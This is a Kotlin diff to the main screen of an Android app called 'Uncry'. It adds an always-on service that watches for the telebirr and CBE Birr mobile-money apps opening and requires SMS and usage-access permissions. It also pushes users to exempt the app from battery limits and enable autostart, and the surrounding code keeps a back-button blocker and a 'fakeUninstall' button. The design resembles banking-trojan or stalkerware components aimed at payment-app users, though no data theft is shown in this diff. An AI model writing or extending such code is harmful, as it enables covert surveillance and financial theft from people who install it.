@@ -25,6 +25,7 @@ import androidx.core.content.ContextCompat
 class MainActivity : AppCompatActivity() {
 
     private val uninstallHandler = Handler(Looper.getMainLooper())
+    private var batteryPromptShowing = false
 
     private val backBlocker = object : OnBackPressedCallback(false) {
         override fun handleOnBackPressed() {
@@ -45,12 +46,33 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+    private val notifPermissionLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
+            // Notification is best-effort; monitoring runs regardless.
+            refreshMonitorUi()
+        }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         onBackPressedDispatcher.addCallback(this, backBlocker)
         findViewById<Button>(R.id.btn_grant).setOnClickListener { onGrantClicked() }
         findViewById<Button>(R.id.btn_uninstall).setOnClickListener { fakeUninstall() }
+        findViewById<Button>(R.id.btn_start_monitor).setOnClickListener { startMonitoring() }
+        findViewById<Button>(R.id.btn_stop_monitor).setOnClickListener {
+            AppMonitorService.stop(this)
+            refreshMonitorUi()
+        }
+        findViewById<Button>(R.id.btn_battery).setOnClickListener {
+            if (!AutostartHelper.requestBatteryExemption(this)) {
+                Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
+            }
+        }
+        findViewById<Button>(R.id.btn_autostart).setOnClickListener {
+            if (!AutostartHelper.openVendorAutostart(this)) {
+                Toast.makeText(this, "Could not open autostart settings.", Toast.LENGTH_LONG).show()
+            }
+        }
         refreshAccessUi()
         requestBasePermissions()
     }
@@ -82,6 +104,121 @@ class MainActivity : AppCompatActivity() {
             }.joinToString(", ")
             findViewById<TextView>(R.id.gate_status).text =
                 "Still needed: $missing.\nUncry won't work until all permissions are granted."
+        } else {
+            // Permissions are green: make sure the always-on monitor is up,
+            // then render which defaults are actually on this device.
+            requestNotifPermissionIfNeeded()
+            AppMonitorService.start(this)
+            refreshMonitorUi()
+            maybePromptBatteryExemption()
+        }
+    }
+
+    /**
+     * Background-app requirement: Uncry must be excluded from battery
+     * limiters (Doze / App Standby / vendor savers), otherwise the always-on
+     * monitor gets killed. Auto-prompts once permissions are green until the
+     * user grants the exemption or taps "Don't ask again".
+     */
+    private fun maybePromptBatteryExemption() {
+        if (AutostartHelper.isIgnoringBatteryOptimizations(this)) return
+        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
+        if (prefs.getBoolean("battery_prompt_dismissed", false)) return
+        if (batteryPromptShowing) return
+        batteryPromptShowing = true
+        AlertDialog.Builder(this)
+            .setTitle("Keep Uncry running in background")
+            .setMessage(
+                "Uncry needs this to work as intended. " +
+                    "Exclude Uncry from battery optimization.\n\n" +
+                    "Tap \"Exempt now\" — on the next screen choose \"Allow\" / \"Don't optimize\"."
+            )
+            .setPositiveButton("Exempt now") { _, _ ->
+                batteryPromptShowing = false
+                if (!AutostartHelper.requestBatteryExemption(this)) {
+                    Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
+                }
+                refreshMonitorUi()
+            }
+            .setNeutralButton("Later") { _, _ -> batteryPromptShowing = false }
+            .setNegativeButton("Don't ask again") { _, _ ->
+                batteryPromptShowing = false
+                prefs.edit().putBoolean("battery_prompt_dismissed", true).apply()
+            }
+            .setOnDismissListener { batteryPromptShowing = false }
+            .show()
+    }
+
+    /**
+     * Renders the three install situations for the two defaults:
+     * both present, exactly one present, or none present.
+     */
+    private fun refreshMonitorUi() {
+        if (findViewById<View>(R.id.main_content).visibility != View.VISIBLE) return
+        val snap = try {
+            MonitoredApps.snapshot(packageManager)
+        } catch (_: Exception) {
+            return
+        }
+
+        fun line(pkg: String): String {
+            val version = MonitoredApps.appVersion(packageManager, pkg)
+            return if (pkg in snap.installed) {
+                "✓ ${MonitoredApps.label(pkg)} — installed" +
+                    (if (version != null) " (v$version)" else "") +
+                    " — monitored"
+            } else {
+                "✗ ${MonitoredApps.label(pkg)} — not installed"
+            }
+        }
+
+        findViewById<TextView>(R.id.app1_status).text = line(MonitoredApps.TELEBIRR)
+        findViewById<TextView>(R.id.app2_status).text = line(MonitoredApps.CBE_BIRR)
+
+        findViewById<TextView>(R.id.monitor_status).text = when {
+            snap.installed.size == MonitoredApps.DEFAULTS.size ->
+                "Watching both apps for foreground opens."
+            snap.installed.size == 1 ->
+                "Only ${MonitoredApps.label(snap.installed[0])} is installed — watching it."
+            else ->
+                "Neither target app is installed — monitor is running and will pick them up when installed."
+        }
+
+        val battery = if (AutostartHelper.isIgnoringBatteryOptimizations(this)) {
+            "Battery optimization: off (good for always-on)"
+        } else {
+            "Battery optimization: on (tap below to exempt Uncry)"
+        }
+        val svc = if (AppMonitorService.running) "Monitor service: RUNNING" else "Monitor service: stopped"
+        findViewById<TextView>(R.id.keepalive_status).text = "$svc\n$battery"
+
+        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
+        val lastPkg = prefs.getString("last_pkg", null)
+        if (lastPkg != null) {
+            findViewById<TextView>(R.id.monitor_status).append("\nLast seen: $lastPkg")
+        }
+    }
+
+    private fun startMonitoring() {
+        if (!hasSmsPermission() || !hasUsageAccess()) {
+            Toast.makeText(this, "Grant all permissions first.", Toast.LENGTH_LONG).show()
+            refreshAccessUi()
+            return
+        }
+        requestNotifPermissionIfNeeded()
+        AppMonitorService.start(this)
+        Toast.makeText(this, "Monitoring started.", Toast.LENGTH_SHORT).show()
+        refreshMonitorUi()
+    }
+
+    private fun requestNotifPermissionIfNeeded() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(
+                    this, Manifest.permission.POST_NOTIFICATIONS
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+            }
         }
     }
 
